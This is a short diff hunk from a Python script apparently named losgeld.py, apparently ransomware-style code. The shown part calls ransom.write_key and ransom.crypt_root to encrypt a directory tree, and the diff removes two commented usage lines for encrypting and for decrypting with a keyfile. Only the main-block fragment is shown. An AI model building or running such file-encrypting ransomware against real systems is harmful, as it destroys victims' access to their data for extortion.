@@ -83,5 +83,3 @@ if __name__ == "__main__":
         ransom.write_key("keyfile")
         ransom.crypt_root(local_root)
 
-    # python3 losgeld.py --action encrypt
-    # python3 losgeld.py --action decrypt --keyfile ./path/to/keyfile
